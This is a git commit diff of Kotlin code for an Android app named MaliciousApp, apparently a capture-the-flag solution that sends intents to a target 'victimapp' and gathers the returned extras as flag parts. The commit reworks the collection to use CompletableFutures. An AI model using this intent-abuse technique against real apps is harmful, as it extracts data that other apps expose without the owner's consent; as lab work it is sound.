4e63ad46827c216ebd7ce284a745908dce376d25
Alberto Lazari <alberto.lazari@gmail.com>
2023-10-13 07:53:34 +0200

    Some blocking concurrency

--- 02-justask/MaliciousApp/app/src/main/java/com/example/maliciousapp/MainActivity.kt
+++ 02-justask/MaliciousApp/app/src/main/java/com/example/maliciousapp/MainActivity.kt
@@ -6,13 +6,20 @@ import android.app.Activity
 import android.content.Intent
 import android.content.ComponentName
 import android.widget.TextView
+import java.util.concurrent.CompletableFuture
 
 class MainActivity : AppCompatActivity() {
-    var flag = ""
+    val flagParts = HashMap<Int, CompletableFuture<String>>().apply {
+        put(1, CompletableFuture<String>())
+        put(2, CompletableFuture<String>())
+        put(3, CompletableFuture<String>())
+        put(4, CompletableFuture<String>())
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        val view = findViewById<TextView>(R.id.debug_text)
 
         // PartOne
         val intent = Intent().apply {
@@ -28,18 +35,23 @@ class MainActivity : AppCompatActivity() {
             action = "com.example.victimapp.intent.action.JUSTASK"
         }
         startActivityForResult(sendIntent, 2)
+
+        var flag = ""
+        for (i in 1..2) {
+            flag += flagParts[i]?.get() + "\n"
+        }
+        view.text = flag
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
         super.onActivityResult(resultCode, resultCode, intent)
 
         val view = findViewById<TextView>(R.id.debug_text)
-        // View what keys were put
         intent?.getExtras()?.let { extras ->
-            extras
+            val flagPart = extras
                 .keySet()
-                .map { key -> flag += extras.getCharSequence(key) }
-            view.text = flag
+                .fold("") { acc, key -> acc + extras.getCharSequence(key) }
+            flagParts[requestCode]?.complete(flagPart)
         }
     }
 }
--- 02-justask/MaliciousApp/app/src/main/java/com/example/maliciousapp/PartOne.kt
+++ 02-justask/MaliciousApp/app/src/main/java/com/example/maliciousapp/PartOne.kt
@@ -4,13 +4,12 @@ import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.app.Activity
 import android.content.Intent
-import android.content.ComponentName
 import android.widget.TextView
 
 class PartOne : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.receive_intent)
+        setContentView(R.layout.activity_main)
 
         intent.data?.let { fileUri ->
             findViewById<TextView>(R.id.debug_text).text = "Content: ${ fileUri.toString() }"
